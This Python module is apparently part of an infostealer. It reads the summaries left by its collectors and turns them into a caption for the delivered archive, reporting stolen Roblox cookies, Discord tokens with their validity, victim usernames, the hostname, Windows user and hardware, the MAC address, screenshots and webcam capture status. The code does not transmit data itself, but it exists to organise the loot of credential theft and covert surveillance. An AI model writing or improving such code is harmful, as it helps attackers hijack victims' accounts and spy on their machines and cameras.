"""Read the small reports back and say, in one block, what the archive contains.

Every collector already writes a JSON summary beside its data. Nobody was reading those
back at the end of a run, so the delivery caption carried item counts and nothing about
what was in them: which accounts, which monitors, whether the camera was blocked.

This is the reader. It opens five small files, takes a handful of fields out of each, and
builds a block that goes into the caption and the manifest. It writes nothing, touches no
module directory, and every failure is a missing line rather than a raised exception —
an enrichment that costs a delivery is worse than one that does not exist.

The 64 KiB cap per file is deliberate: these are summaries, and a file several times
larger than the largest one observed is not one of them.
"""

from __future__ import annotations

import json
from pathlib import Path
from typing import Any, Final

from . import layout, log, platforms

_MAX_BYTES: Final[int] = 64 * 1024


def _read(root: Path, relative: str) -> Any:
    """One JSON document, or None. Never raises, never parses anything else."""
    path = root / relative
    try:
        if not path.is_file() or path.stat().st_size > _MAX_BYTES:
            return None
        return json.loads(path.read_text(encoding="utf-8"))
    except (OSError, ValueError):
        log.logger.debug("enrich: %s unreadable", relative, exc_info=True)
        return None


def _roblox(document: Any) -> dict[str, Any] | None:
    """``roblox_status.json``: how many cookies, and the reason when there were none."""
    if not isinstance(document, dict):
        return None
    found = int(document.get("found") or 0)
    reason = str(document.get("reason") or "")
    record: dict[str, Any] = {"platform": "roblox", "count": found}
    if reason:
        record["status"] = reason
    if not found and not reason:
        return None
    return record


def _discord(document: Any) -> dict[str, Any] | None:
    """``sessions.json``: a list of token records, one per profile it came from."""
    if not isinstance(document, list) or not document:
        return None
    records = [item for item in document if isinstance(item, dict)]
    if not records:
        return None
    valid = sum(1 for item in records if item.get("valid"))
    record: dict[str, Any] = {
        "platform": "discord",
        "count": len(records),
        "status": f"{valid} valid" if valid else "unverified",
    }
    name = next(
        (
            item.get(key)
            for item in records
            for key in ("username", "global_name", "name")
            if item.get(key)
        ),
        None,
    )
    if name:
        record["name"] = name
    return record


def _text(value: Any) -> str:
    """A scalar as a stripped string, or empty. Nested structures are not scalars."""
    if isinstance(value, str | int | float):
        return str(value).strip()
    return ""


def _nested(value: Any, key: str) -> str:
    """One field out of a ``{"name": ..}`` block. Empty when the shape is not that."""
    if isinstance(value, dict):
        return _text(value.get(key))
    return _text(value)


def _os(value: Any) -> str:
    """``Windows 10 Pro 26200.8875`` from the system collector's nested block."""
    if not isinstance(value, dict):
        return _text(value)
    product = _text(value.get("product"))
    build = _text(value.get("build"))
    return " ".join(part for part in (product, build) if part)


def collect(root: Path) -> dict[str, Any]:
    """Everything worth repeating in a caption, grouped by platform. Soft-fails to ``{}``."""
    try:
        result: dict[str, Any] = {}

        accounts: list[dict[str, Any]] = []
        for document, reader in (
            (_read(root, "accounts/roblox_status.json"), _roblox),
            (_read(root, "accounts/sessions.json"), _discord),
        ):
            record = reader(document)
            if record is not None:
                accounts.append(record)
        if accounts:
            result["accounts"] = accounts

        system = _read(root, "system/system.json")
        if isinstance(system, dict) and system:
            host = {
                "hostname": _text(system.get("hostname")),
                "user": _nested(system.get("user"), "name"),
                "os": _os(system.get("os")),
                "cpu": _nested(system.get("cpu"), "name"),
                "ram_gib": _text(system.get("ram_gib")),
                "gpu": _text(system.get("gpu")),
            }
            present = {key: value for key, value in host.items() if value}
            if present:
                result["host"] = present

        network = _read(root, "system/network.json")
        if isinstance(network, dict) and network:
            adapters = network.get("adapters")
            found = {
                "primary_mac": _text(network.get("primary_mac")),
                "adapters": str(len(adapters)) if isinstance(adapters, list) else "",
            }
            present = {key: value for key, value in found.items() if value}
            if present:
                result["network"] = present

        screen = _read(root, f"{layout.MODULE_DIRS['screen']}/screen.json")
        if isinstance(screen, dict) and screen:
            monitors = screen.get("monitors")
            result["screen"] = {
                "count": screen.get("count", 0),
                "captured": screen.get("captured", 0),
                "skipped": len(screen.get("skipped") or []),
                "elapsed_millis": screen.get("elapsed_millis", 0),
                "primary": next(
                    (
                        {"width": item.get("width"), "height": item.get("height")}
                        for item in (monitors or [])
                        if isinstance(item, dict) and item.get("primary")
                    ),
                    None,
                ),
            }

        camera = _read(root, f"{layout.MODULE_DIRS['camera']}/camera.json")
        if isinstance(camera, dict) and camera:
            result["camera"] = {
                key: camera[key]
                for key in ("status", "device", "width", "height", "reason")
                if camera.get(key) not in (None, "")
            }

        return result
    except Exception:
        log.logger.debug("enrich: suppressed", exc_info=True)
        return {}


def lines(enrichment: dict[str, Any], counts: dict[str, int]) -> list[str]:
    """The caption block: one line per fact that exists, nothing for the ones that do not."""
    block: list[str] = []

    volume = platforms.line(counts)
    if volume:
        block.append(f"**platforms** {volume}")

    for account in enrichment.get("accounts") or []:
        if not isinstance(account, dict):
            continue
        name = account.get("name") or account.get("user") or account.get("id") or ""
        status = account.get("status") or ""
        detail = " · ".join(
            str(part)
            for part in (name, status, f"{account['count']} found" if account.get("count") else "")
            if part
        )
        if detail:
            block.append(f"**{account.get('platform', 'account')}** {detail}")

    host = enrichment.get("host")
    if isinstance(host, dict) and host:
        block.append("**host** " + " · ".join(str(value) for value in host.values()))

    network = enrichment.get("network")
    if isinstance(network, dict) and network:
        parts = [
            str(network[key])
            for key in ("primary_mac",)
            if network.get(key)
        ]
        if network.get("adapters"):
            parts.append(f"{network['adapters']} adapters")
        if parts:
            block.append("**network** " + " · ".join(parts))

    screen = enrichment.get("screen")
    if isinstance(screen, dict):
        primary = screen.get("primary") or {}
        shape = (
            f" {primary['width']}x{primary['height']}"
            if isinstance(primary, dict) and primary.get("width")
            else ""
        )
        block.append(
            f"**screen** {screen.get('captured', 0)}/{screen.get('count', 0)} monitor(s)"
            f"{shape} · {screen.get('elapsed_millis', 0)} ms"
        )

    camera = enrichment.get("camera")
    if isinstance(camera, dict) and camera.get("status"):
        shape = (
            f" {camera['width']}x{camera['height']}"
            if camera.get("width") and camera.get("height")
            else ""
        )
        reason = f" ({camera['reason']})" if camera.get("reason") else ""
        block.append(f"**camera** {camera['status']}{shape}{reason}")

    return block


__all__ = ["collect", "lines"]
